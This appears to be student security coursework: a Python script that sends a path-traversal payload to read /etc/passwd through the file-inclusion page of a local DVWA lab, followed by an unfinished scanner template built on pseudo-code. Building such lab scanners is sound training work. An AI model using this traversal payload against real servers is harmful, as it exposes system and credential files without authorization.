import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re 

# --- CONFIGURATION ---
# IMPORTANT: Make sure this port matches the one you use in your server
BASE_URL = "http://host.docker.internal:8084" 

# --- STEP 1: PASTE YOUR COOKIE HERE ---
# Paste the 'PHPSESSID' value you copied from your browser
YOUR_COOKIE_VALUE = "a24921haem2i09g35rsk9t3a20"
# ---

# This is our new target page
FILE_TEST_URL = f"{BASE_URL}/vulnerabilities/fi/"

# This payload tries to "climb" up the directory tree to read the main password file
FILE_PAYLOAD = "../../../../../../etc/passwd" 

# Create a session object to handle cookies
session = requests.Session()

# This header makes us look like a real browser
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})

# --- THIS IS THE MANUAL COOKIE METHOD ---
session.cookies.set('security', 'low')
session.cookies.set('PHPSESSID', YOUR_COOKIE_VALUE)
print("[*] Manual cookies have been set.")
# --- END OF COOKIE METHOD ---


def test_file_inclusion(url, payload):
    """
    Tests the File Inclusion page by sending a payload in the URL.
    """
    print(f"\n[+] Testing page: {url}")
    
    # This page takes the 'page' parameter in the URL (a GET request)
    # e.g., .../fi/?page=../../etc/passwd
    data_to_submit = {
        'page': payload
    }
            
    print(f"    [*] Submitting payload: {payload}")
    
    try:
        # Use the session, which now has our cookies
        response = session.get(url, params=data_to_submit) 
        
        if response.status_code != 200:
            print(f"[!] Warning: Got status code {response.status_code}")
            return
            
        # Check if we were redirected to the login page
        if "login.php" in response.url:
            print("[!] FAILED. Server redirected to login.php. Your cookie might be wrong or expired.")
            return

        print("[+] Success! Got the File Inclusion test page.")
        
        # 5. Check if the attack worked!
        # A successful attack will show the contents of the /etc/passwd file.
        # We can check for the "root" user, which is always in that file.
        if "root:x:0:0" in response.text:
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
            print(f"    [!!!] FILE INCLUSION VULNERABILITY FOUND [!!!]")
            print(f"    [+] Payload was successful and read /etc/passwd.")
            print(f"    [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]")
        else:
            print(f"    [!] Payload did not return expected content. Attack may have failed.")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] ERROR: Could not crawl {url}. Error: {e}")


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    
    if YOUR_COOKIE_VALUE == "PASTE_YOUR_COOKIE_HERE":
        print("[!] ERROR: Please paste your PHPSESSID cookie into the script on line 11.")
    else:
        print(f"\n--- STARTING FILE INCLUSION SCAN ON {FILE_TEST_URL} ---")
        
        # Now that cookies are set, call the test
        test_file_inclusion(FILE_TEST_URL, FILE_PAYLOAD)
        
        print("\n--- CRAWL FINISHED ---")

        # week5_scanner.py

# --- Put all your imports here ---
# e.g., import requests
# from bs4 import BeautifulSoup
# ...

# This is the function week7_scanner is looking for
def scan(target_url):
    """
    Runs the Authentication & Session scan and returns a list of findings.
    """
    print(f"Scanning {target_url} for Authentication/Session issues...")

    # This list will hold all the vulnerabilities you find
    findings = []

    # ==========================================================
    # ===> PUT YOUR WEEK 5 SCANNING LOGIC HERE <===
    #
    # All of your code from the old week5_scanner.py
    # goes here, and it must be indented.
    # (e.g., your code to test for weak passwords,
    # insecure cookies, or session fixation)
    #
    # ==========================================================


    # --- THIS IS THE IMPORTANT CHANGE ---
    # Find the part of your code where you check if a vulnerability was found.
    # Instead of just printing, do this:
    
    # PSEUDO-CODE: Replace this with your real check
    if you_find_a_weak_password_or_session_issue:
        print("Authentication vulnerability found!") # You can keep your print
        
        # Create the dictionary
        vulnerability = {
            "type": "Broken Authentication",
            "endpoint": "http://example.com/login", # The URL you tested
            "severity": "High",
            "mitigation": "Enforce strong password policies and use secure, HttpOnly cookies."
        }
        # Add the dictionary to the 'findings' list
        findings.append(vulnerability)

    # At the very end of your function, return the list
    return findings


# This part goes at the VERY BOTTOM, with NO indentation.
# This lets you still run 'python week5_scanner.py' to test it.
if __name__ == "__main__":
    
    test_url = "http://127.0.0.1/dvwa" # Change this to your test URL
    
    results = scan(test_url)
    
    if results:
        print("Vulnerabilities found:")
        for res in results:
            print(res)
    else:
        print("No vulnerabilities found.")
